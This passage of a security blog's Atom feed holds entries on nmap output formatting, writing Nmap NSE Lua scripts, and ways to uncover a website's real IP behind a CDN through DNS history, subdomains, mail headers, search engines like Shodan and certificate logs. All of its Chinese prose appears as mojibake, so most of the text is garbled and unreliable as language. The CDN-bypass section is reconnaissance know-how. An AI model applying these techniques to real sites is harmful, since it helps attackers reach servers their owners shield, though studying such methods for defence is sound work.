class="selector-tag">oX</span>ï¼Œ<span class="selector-tag">oS</span>ï¼Œ<span class="selector-tag">oG</span>ï¼ˆç»“æœä¸ºä¸€èˆ¬æ¨¡å¼ã€‚<span class="selector-tag">XML</span>ï¼Œ<span class="selector-tag">kiddi3</span>ï¼Œ<span class="selector-tag">grepable</span>æ ¼å¼ï¼‰</span><br><span class="line"><span class="selector-tag">nmap</span>è¾“å‡º <span class="selector-tag">ip</span>ï¼š<span class="selector-tag">port</span> æ ¼å¼ï¼š</span><br><span class="line">nmap -vv -p 80 192.168.1.0/24 | grep â€œDiscovered open portâ€ | awk &#123;â€˜print $6â€:â€$4â€™&#125; | awk -F/ &#123;â€˜print $1â€™&#125; &gt; output.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;nampç«¯å£çŠ¶æ€&quot;&gt;nampç«¯å£çŠ¶æ€&lt;/h2&gt;
&lt;figure class=&quot;highlight less&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="NMAP" scheme="http://yoursite.com/tags/NMAP/"/>
    
  </entry>
  
  <entry>
    <title>NSEç¼–å†™</title>
    <link href="http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/</id>
    <published>2020-06-27T06:52:11.000Z</published>
    <updated>2020-06-27T06:53:26.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NSEç®€ä»‹">NSEç®€ä»‹</h2><blockquote><p>Nmap ä¸€æ¬¾æ ‡å¿—æ€§çš„è·¨å¹³å°æ‰«æå™¨ã€‚å®ƒçš„åŸæ„ä¸ºNetwork Mapperï¼ˆç½‘ç»œæ˜ å°„å™¨ï¼‰ï¼Œå…·æœ‰ç›¸å½“å¼ºå¤§çš„æ‰«æåŠŸèƒ½ã€‚Nmapè¿˜å¯æ ¹æ®NSE (Nmap scripting Engine)çš„è„šæœ¬è¿›è¡Œå¤§é‡æ¸—é€å·¥ä½œï¼Œè¿™ç§è„šæœ¬æ˜¯åŸºäºLuaç¼–ç¨‹è¯­è¨€ã€‚æ­£æ˜¯NSEï¼Œä½¿å¾—Nmapä¸å†æ™®é€šã€‚</p></blockquote><h3 id="Nmapçš„ç›®å½•ç»“æ„">Nmapçš„ç›®å½•ç»“æ„</h3><p><strong>Linux</strong></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627140946.png" alt=""></p><p><strong>Windows</strong></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627140933.png" alt=""></p><p>ä¸»è¦å…³æ³¨ä¸¤ä¸ªç›®å½•ï¼š</p><ul><li>neslibå­˜æ”¾ç€å„ç§åº“æ–‡ä»¶</li><li>scriptå­˜æ”¾ç€NSEè„šæœ¬</li></ul><p>nmapè„šæœ¬å’Œåº“æ–‡ä»¶æ‰‹å†Œï¼š<a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">https://nmap.org/nsedoc/</a></p><h2 id="NSEä¸­çš„åº“æ–‡ä»¶">NSEä¸­çš„åº“æ–‡ä»¶</h2><p>NSEä¸­çš„åº“æ–‡ä»¶å®ç°äº†ä»£ç çš„åˆ†ç¦»å’Œé‡æ„ï¼Œæœ‰åŠ©äºè„šæœ¬çš„å¼€å‘ï¼Œå…¶å­˜æ”¾åœ¨nselibæ–‡ä»¶å¤¹ä¸­ã€‚</p><h3 id="åº“æ–‡ä»¶çš„ç¼–å†™">åº“æ–‡ä»¶çš„ç¼–å†™</h3><p>åˆ›å»ºä¸€ä¸ªåº“æ–‡ä»¶ä¿å­˜ä¸ºdemo.luaï¼Œç”¨äºå¯¹äºä¼ å…¥çš„å‚æ•° è¿”å› è¿™ä¸ªç«¯å£ æ˜¯å¼€å¯çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Test( port )</span><br><span class="line">return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>åœ¨è„šæœ¬æ–‡ä»¶ä¸­å¼•å…¥è¿™ä¸ªåº“æ–‡ä»¶ï¼Œå¼•å…¥åº“æ–‡ä»¶çš„æ ¼å¼ä¸€èˆ¬ä¸º<br><strong>local åº“æ–‡ä»¶å = require â€œåº“æ–‡ä»¶åâ€</strong><br>ä¸šç•Œäººå£«ç§°ï¼Œåœ¨luaä¸­ï¼Œå¦‚æœæ˜¯ä¸€äº›ç»å¸¸ç”¨åˆ°çš„å…¨å±€å‡½æ•°ï¼Œå¯ä»¥ç”³æ˜ä¸ºlocalå±€éƒ¨å˜é‡ï¼Œè¿™æ ·åšå¯ä»¥æå‡æ•ˆç‡ã€‚</p><p>åœ¨è„šæœ¬ä¸­ä½¿ç”¨æ­¤åº“æ–‡ä»¶ä¸­çš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line">local demo &#x3D; require &quot;demo&quot;</span><br><span class="line">description &#x3D; [[neslib demo test]]</span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host,port)</span><br><span class="line">    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 30081  and port.state &#x3D;&#x3D;&quot;open&quot;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line">return Test(port.number)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="NSEç¼–å†™è§„åˆ™">NSEç¼–å†™è§„åˆ™</h2><h3 id="NSEè„šæœ¬ç¼–å†™æµç¨‹">NSEè„šæœ¬ç¼–å†™æµç¨‹</h3><p>å¤§è‡´åˆ†ä¸ºå››æ­¥ï¼š</p><blockquote><ol><li>å¯¼å…¥è„šæœ¬æ‰€éœ€åº“</li><li>è„šæœ¬æè¿°ä¿¡æ¯åŠåˆ†ç±»</li><li>ruleç±»å‹ï¼šè„šæœ¬çš„è§¦å‘è§„åˆ™</li><li>actionï¼šè„šæœ¬å…·ä½“æ‰§è¡Œå†…å®¹ï¼Œruleè§¦å‘è§„åˆ™ä¸ºçœŸæ—¶æ‰§è¡Œactionå®šä¹‰çš„å‡½æ•°</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627105747.jpg" alt=""></p><h3 id="Ruleå››ç§ç±»å‹">Ruleå››ç§ç±»å‹</h3><p>Ruleï¼šç”¨äºæè¿°è„šæœ¬çš„è§¦å‘è§„åˆ™ï¼Œè¿”å›å€¼åªæœ‰trueå’Œfalseä¸¤ç§ã€‚è¿”å›å€¼å†³å®šäº†åé¢actionå¯¹åº”çš„å‡½æ•°æ˜¯å¦æ‰§è¡Œï¼Œæ³¨æ„ï¼štrue(æ‰§è¡Œ),flase(ä¸æ‰§è¡Œ)ã€‚å®ƒæœ‰å››ç§ç±»å‹åˆ†åˆ«æ˜¯</p><ol><li>prerule()ï¼šä¸æ¥æ”¶å‚æ•°ï¼Œè„šæœ¬åªè¿è¡Œä¸€æ¬¡ï¼Œ<font color=red>åœ¨ä¸»æœºå‘ç°ä¹‹å‰</font>ï¼Œå‘ç”Ÿåœ¨é¢„æ‰«æé˜¶æ®µã€‚è¿”å›çš„å€¼æ°¸è¿œä¸ºçœŸã€‚</li><li>hostrule(host)ï¼šè®¾å®šå‚æ•°ä¸ºç›®æ ‡çš„ipåœ°å€æˆ–ä¸»æœºåï¼Œnmapå®Œæˆäº†<font color=red>ä¸»æœºå‘ç°ä¹‹å</font>å†è¿è¡Œè„šæœ¬ã€‚</li><li>portrule(host,port)ï¼šè®¾å®šå‚æ•°éœ€è¦ä¸»æœºä»¥åŠç«¯å£ã€‚<font color=red>åœ¨ç«¯å£æ‰«ææ—¶</font>ï¼Œæ¯ä¸ªç«¯å£è¿è¡Œä¸€æ¬¡ï¼Œå¤„äºopenï¼Œopen|filteredï¼Œæˆ–è€…unfilteredçŠ¶æ€çš„æ‰€æœ‰ç«¯å£ã€‚</li><li>postrule()ï¼šä¸æ¥æ”¶å‚æ•°ï¼Œnmapå®Œæˆ<font color=red>æ‰€æœ‰ä¸»æœºå·²ç»è¢«æ‰«æå</font>ï¼Œåœ¨è„šæœ¬çš„åæ‰«æé˜¶æ®µã€‚è¿”å›çš„å€¼æ°¸è¿œä¸ºçœŸã€‚</li></ol><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>åœ¨æ‰«æä¹‹å‰è§¦å‘è„šæœ¬ï¼Œæ‰“å°<code>I Love China.</code></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[test]]</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"Edsion"</span></span><br><span class="line">license = <span class="string">"Same as Nmapâ€â€See http://nmap.org/book/manâ€legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line"></span><br><span class="line">prerule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"I Love China."</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•æ¨¡å¼">è°ƒè¯•æ¨¡å¼</h3><p>åœ¨æµ‹è¯•é˜¶æ®µæˆ‘ä»¬éš¾å…ä¼šå‡ºç°é”™è¯¯,é‚£å‡è®¾æˆ‘ä»¬å‡ºç°äº†é”™è¯¯æˆ‘ä»¬åº”è¯¥å¦‚ä½•è§£å†³å‘¢ã€‚è¿™æ—¶æˆ‘ä»¬éœ€è¦å€ŸåŠ©Nmapçš„è°ƒè¯•æ¨¡å¼è¿›è¡Œè°ƒè¯•ï¼Œåªéœ€è¦åŠ ä¸Š-dé€‰é¡¹å³å¯è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œé‚£ä¸€èˆ¬é€‰æ‹©-d 3ï¼Œ3ä»£è¡¨çš„æ˜¯ç­‰çº§ï¼Œç­‰çº§è¶Šé«˜ï¼Œè¶Šè¯¦ç»†ã€‚</p><h2 id="nmap-API">nmap API</h2><blockquote><p>nmapä¸­APIçš„æ ¸å¿ƒåŠŸèƒ½å°±æ˜¯å‘è„šæœ¬æä¾›ä¸»æœºå’Œç«¯å£çš„ä¿¡æ¯ã€‚<br>ä¸¤ä¸ªlua tableç±»å‹çš„å‚æ•°ï¼šhost table ã€ port table</p></blockquote><table><thead><tr><th>host</th><th>tableç±»å‹</th></tr></thead><tbody><tr><td>host.os</td><td>æ“ä½œç³»ç»Ÿä¿¡æ¯</td></tr><tr><td>host.ip</td><td>tagret(ç›®æ ‡ä¸»æœº)å¯¹åº”çš„ip,ä¾‹å¦‚ä¸‹é¢çš„127.0.0.1</td></tr><tr><td><a href="http://host.name" target="_blank" rel="noopener">host.name</a></td><td>tagertåœ¨å‘½ä»¤è¡Œå¯¹åº”çš„åå­—ï¼Œ<a href="http://xn--zzcms-bi1hr3gd63auv3d8xxd.im" target="_blank" rel="noopener">ä¾‹å¦‚ä¸‹é¢çš„zzcms.im</a></td></tr><tr><td>host.targetname</td><td><a href="http://xn--host-z94f813a.name" target="_blank" rel="noopener">åŒä¸Šhost.name</a>ï¼Œæˆ‘ä¸ªäººæ˜¯è¿™æ ·è®¤ä¸ºçš„</td></tr><tr><td>host.directly_connected</td><td>åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦ä¸æœ¬æœºåœ¨åŒä¸€ä¸ªå­ç½‘</td></tr><tr><td>host.mac_addr</td><td>macåœ°å€ ï¼ˆå¿…é¡»æ˜¯åŒä¸€å­ç½‘çš„è®¾å¤‡è¿™ä¸ªå‘½ä»¤æ‰æœ‰æ•ˆï¼‰</td></tr></tbody></table><table><thead><tr><th>port</th><th>tableç±»å‹</th></tr></thead><tbody><tr><td>port.number</td><td>ç«¯å£å·</td></tr><tr><td>port.protocol</td><td>åè®®</td></tr><tr><td>port.service</td><td>æœåŠ¡ httpæˆ–https</td></tr><tr><td>port.version</td><td>ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>port.state</td><td>ç«¯å£çŠ¶æ€</td></tr></tbody></table><h2 id="httpåº“å‚æ•°æ‰©å±•">httpåº“å‚æ•°æ‰©å±•</h2><table><thead><tr><th>http</th><th>åº“</th></tr></thead><tbody><tr><td>get()</td><td>å‘èµ·getè¯·æ±‚ï¼Œè¯·æ±‚ç»“æœä»¥ä¸€ä¸ªtableçš„å½¢å¼è¿”å›</td></tr><tr><td>host</td><td>è¦è¯·æ±‚çš„ä¸»æœº</td></tr><tr><td>path</td><td>è¦æ£€ç´¢çš„è·¯å¾„</td></tr><tr><td>options</td><td>å¯é€‰ï¼Œå…è®¸è°ƒç”¨è€…æ§åˆ¶socket,è¯·æ±‚å¤´çš„table</td></tr><tr><td>port</td><td>è¦æ£€ç´¢çš„ç«¯å£</td></tr><tr><td></td><td></td></tr><tr><td>post()</td><td>å‘èµ·postè¯·æ±‚ï¼Œè¯·æ±‚ç»“æœä»¥ä¸€ä¸ªtableçš„å½¢å¼è¿”å›</td></tr><tr><td>ignored</td><td>å‘åå…¼ç”¨ï¼Œä¸€èˆ¬å¡«å†™nilï¼Œå¿½ç•¥å³å¯</td></tr><tr><td>postdata</td><td>postæ•°æ®ï¼Œå­—ç¬¦ä¸²æˆ–è€…tableæ ¼å¼</td></tr><tr><td>host</td><td>è¦è¯·æ±‚çš„ä¸»æœº</td></tr><tr><td>path</td><td>è¦æ£€ç´¢çš„è·¯å¾„</td></tr><tr><td>options</td><td>å¯é€‰ï¼Œå…è®¸è°ƒç”¨è€…æ§åˆ¶socket,è¯·æ±‚å¤´,è¶…æ—¶æ—¶é—´çš„table</td></tr><tr><td>port</td><td>è¦æ£€ç´¢çš„ç«¯å£</td></tr></tbody></table><h2 id="NSEè„šæœ¬åˆ†ç±»">NSEè„šæœ¬åˆ†ç±»</h2><table><thead><tr><th>è„šæœ¬ç±»åˆ«</th><th>æè¿°</th></tr></thead><tbody><tr><td>auth</td><td>ä¸ç”¨æˆ·è®¤è¯ç›¸å…³çš„NSEè„šæœ¬</td></tr><tr><td>broadcast</td><td>åœ¨å±€åŸŸç½‘å†…æ¢æŸ¥æ›´å¤šæœåŠ¡å¼€å¯çŠ¶å†µï¼Œå¦‚dhcp/dns/sqlserverç­‰æœåŠ¡</td></tr><tr><td>brute</td><td>æš´åŠ›ç ´è§£</td></tr><tr><td>default</td><td>é»˜è®¤ï¼Œæ‰§è¡Œè„šæœ¬ï¼ˆ-Aæˆ–è€…-sCï¼‰</td></tr><tr><td>discovery</td><td>ä¸ä¸»æœºå’ŒæœåŠ¡å‘ç°ç›¸å…³çš„è„šæœ¬</td></tr><tr><td>dos</td><td>ä¸æ‹’ç»æœåŠ¡æ”»å‡»æœ‰å…³çš„è„šæœ¬</td></tr><tr><td>exploit</td><td>åˆ©ç”¨å·²çŸ¥çš„æ¼æ´å…¥ä¾µç³»ç»Ÿ</td></tr><tr><td>external</td><td>åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æ</td></tr><tr><td>fuzzer</td><td>æ¨¡ç³Šæµ‹è¯•çš„è„šæœ¬ï¼Œå‘é€å¼‚å¸¸çš„åŒ…åˆ°ç›®æ ‡æœºï¼Œæ¢æµ‹å‡ºæ½œåœ¨æ¼æ´</td></tr><tr><td>intrusive</td><td>å…¥ä¾µæ€§çš„è„šæœ¬ï¼Œæ­¤ç±»è„šæœ¬å¯èƒ½å¼•å‘å¯¹æ–¹çš„IDS/IPSçš„è®°å½•æˆ–å±è”½</td></tr><tr><td>malware</td><td>æ¢æµ‹ç›®æ ‡æœºæ˜¯å¦æ„ŸæŸ“äº†ç—…æ¯’ã€å¼€å¯äº†åé—¨ç­‰ä¿¡æ¯</td></tr><tr><td>safe</td><td>æ­¤ç±»ä¸intrusiveç›¸åï¼Œå±äºå®‰å…¨æ€§è„šæœ¬</td></tr><tr><td>vuln</td><td>è´Ÿè´£æ£€æŸ¥ç›®æ ‡æœºæ˜¯å¦æœ‰å¸¸è§çš„æ¼æ´ï¼ˆVulnerabilityï¼‰ï¼Œå¦‚æ˜¯å¦æœ‰MS08_067</td></tr><tr><td>version</td><td>è´Ÿè´£å¢å¼ºæœåŠ¡ä¸ç‰ˆæœ¬æ‰«æï¼ˆVersion Detectionï¼‰åŠŸèƒ½çš„è„šæœ¬</td></tr></tbody></table><h2 id="NSEè„šæœ¬ä½¿ç”¨">NSEè„šæœ¬ä½¿ç”¨</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åŠ è„šæœ¬åç§°</span><br><span class="line">nmap --script http-title &lt;target&gt;</span><br><span class="line">nmap --script http-titleï¼Œhttp-methods &lt;target&gt;</span><br><span class="line"></span><br><span class="line">ç±»åˆ«</span><br><span class="line">nmap --script exploit &lt;target&gt;</span><br><span class="line">æ‚¨ä¹Ÿå¯ä»¥ç”¨é€—å·åˆ†éš”å®ƒä»¬æ¥è¿è¡Œå¤šä¸ªç±»åˆ«ï¼š</span><br><span class="line">nmap --script discovery,intrusive &lt;target&gt;</span><br><span class="line"></span><br><span class="line">è·¯å¾„æˆ–æ–‡ä»¶åï¼ˆæ–‡ä»¶å¤¹ï¼‰</span><br><span class="line">nmap --script /path/to/script.nse &lt;target&gt;</span><br><span class="line">nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">è¡¨è¾¾å¼</span><br><span class="line">nmap -sV --script "not exploit" &lt;target&gt;</span><br><span class="line">nmap --script "notï¼ˆintrusive or dos or exploitï¼‰" -sV &lt;target&gt;</span><br><span class="line">é€šé…ç¬¦</span><br><span class="line">nmap --script "snmp- *" &lt;target&gt;</span><br><span class="line"></span><br><span class="line">ä¸ºè„šæœ¬æä¾›å‚æ•° </span><br><span class="line">--script-args=x=x,y=y</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;NSEç®€ä»‹&quot;&gt;NSEç®€ä»‹&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nmap ä¸€æ¬¾æ ‡å¿—æ€§çš„è·¨å¹³å°æ‰«æå™¨ã€‚å®ƒçš„åŸæ„ä¸ºNetwork Mapperï¼ˆç½‘ç»œæ˜ å°„å™¨ï¼‰ï¼Œå…·æœ‰ç›¸å½“å¼ºå¤§çš„æ‰«æåŠŸèƒ½ã€‚Nmapè¿˜å¯æ ¹æ®NSE (Nmap scripting Engine)çš„è„šæœ¬è¿›è¡Œå¤§
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="NMAP" scheme="http://yoursite.com/tags/NMAP/"/>
    
  </entry>
  
  <entry>
    <title>ç»•è¿‡CDNå¯»æ‰¾çœŸå®IP</title>
    <link href="http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/"/>
    <id>http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/</id>
    <published>2020-06-23T04:17:11.000Z</published>
    <updated>2020-07-04T14:05:44.404Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ç›®å‰å¾ˆå¤šç«™ç‚¹å‡ºäºç”¨æˆ·ä½“éªŒå’Œå®‰å…¨çš„è§’åº¦ï¼Œä½¿ç”¨CDNåŠ é€Ÿï¼Œå°†åŸŸåè§£æåˆ°CDNï¼Œè¿™æ—¶å€™å°±éœ€è¦ç»•è¿‡CDNæ¥æŸ¥æ‰¾çœŸå®IPã€‚</p></blockquote><h2 id="ä¸€ã€DNSå†å²è§£æè®°å½•">ä¸€ã€DNSå†å²è§£æè®°å½•</h2><p>æŸ¥è¯¢åŸŸåçš„å†å²è§£æè®°å½•ï¼Œæ‰¾ç½‘ç«™ä½¿ç”¨CDNå‰çš„è§£æè®°å½•ï¼Œä»è€Œè·å–çœŸå®ipï¼Œç›¸å…³æŸ¥è¯¢çš„ç½‘ç«™æœ‰ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iphistoryï¼šhttps://viewdns.info/iphistory/</span><br><span class="line">DNSæŸ¥è¯¢ï¼šï¼ˆhttps://dnsdb.io/zh-cn/ï¼‰</span><br><span class="line">å¾®æ­¥åœ¨çº¿ï¼šï¼ˆhttps://x.threatbook.cn/ï¼‰</span><br><span class="line">åŸŸåæŸ¥è¯¢ï¼šï¼ˆhttps://site.ip138.com/ï¼‰</span><br><span class="line">DNSå†å²æŸ¥è¯¢ï¼šï¼ˆhttps://securitytrails.com/ï¼‰</span><br><span class="line">Netcraftï¼šhttps://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure><h2 id="äºŒã€å­åŸŸå">äºŒã€å­åŸŸå</h2><p>å¾ˆå¤šæ—¶å€™ï¼Œä¸€äº›é‡è¦çš„ç«™ç‚¹ä¼šåšCDNï¼Œè€Œä¸€äº›å­åŸŸåç«™ç‚¹å¹¶æ²¡æœ‰åŠ å…¥CDNï¼Œè€Œä¸”è·Ÿä¸»ç«™åœ¨åŒä¸€ä¸ªCæ®µå†…ï¼Œè¿™æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡æŸ¥æ‰¾å­åŸŸåæ¥æŸ¥æ‰¾ç½‘ç«™çš„çœŸå®IPã€‚<br>å¸¸ç”¨çš„å­åŸŸåæŸ¥æ‰¾æ–¹æ³•å’Œå·¥å…·ï¼š</p><ol><li>æœç´¢å¼•æ“æŸ¥è¯¢ï¼šå¦‚Googleã€baiduã€Bingç­‰ä¼ ç»Ÿæœç´¢å¼•æ“ï¼Œsite:baidu.com inurl:baidu.comï¼Œæœtarget.com|å…¬å¸åå­—ã€‚</li><li>åœ¨çº¿æŸ¥è¯¢ç½‘ç«™ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure><ol start="3"><li>å­åŸŸåçˆ†ç ´å·¥å…·</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Layerå­åŸŸåæŒ–æ˜æœº</span><br><span class="line">wydomainï¼šhttps:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€ç½‘ç«™é‚®ä»¶å¤´ä¿¡æ¯">ä¸‰ã€ç½‘ç«™é‚®ä»¶å¤´ä¿¡æ¯</h2><p>æ¯”å¦‚ï¼šé‚®ç®±æ³¨å†Œï¼Œé‚®ç®±æ‰¾å›å¯†ç ã€RSSé‚®ä»¶è®¢é˜…ç­‰åŠŸèƒ½åœºæ™¯ï¼Œé€šè¿‡ç½‘ç«™ç»™è‡ªå·±å‘é€é‚®ä»¶ï¼Œä»è€Œè®©ç›®æ ‡ä¸»åŠ¨æš´éœ²ä»–ä»¬çš„çœŸå®çš„IPï¼ŒæŸ¥çœ‹é‚®ä»¶å¤´ä¿¡æ¯ï¼Œè·å–åˆ°ç½‘ç«™çš„çœŸå®IPã€‚</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p><h2 id="å››ã€ç½‘ç»œç©ºé—´å®‰å…¨å¼•æ“æœç´¢">å››ã€ç½‘ç»œç©ºé—´å®‰å…¨å¼•æ“æœç´¢</h2><p>é€šè¿‡å…³é”®å­—æˆ–ç½‘ç«™åŸŸåï¼Œå°±å¯ä»¥æ‰¾å‡ºè¢«æ”¶å½•çš„IPï¼Œå¾ˆå¤šæ—¶å€™è·å–åˆ°çš„å°±æ˜¯ç½‘ç«™çš„çœŸå®IPã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é’Ÿé¦—ä¹‹çœ¼ï¼šhttps:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodanï¼šhttps:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofaï¼šhttps:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure><h2 id="äº”ã€åˆ©ç”¨SSLè¯ä¹¦">äº”ã€åˆ©ç”¨SSLè¯ä¹¦</h2><p>è¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL/TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤SSL/TLSè¯ä¹¦æˆä¸ºäº†æ”»å‡»è€…çš„åˆ‡å…¥ç‚¹ã€‚<br>SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure><h2 id="å…­ã€å›½å¤–ä¸»æœºè§£æåŸŸå">å…­ã€å›½å¤–ä¸»æœºè§£æåŸŸå</h2><p>å¤§éƒ¨åˆ† CDN å‚å•†å› ä¸ºå„ç§åŸå› åªåšäº†å›½å†…çš„çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ï¼Œæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨å›½å¤–çš„DNSæŸ¥è¯¢ï¼Œå¾ˆå¯èƒ½è·å–åˆ°çœŸå®IPã€‚<br>å›½å¤–å¤šPINGæµ‹è¯•å·¥å…·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure><h2 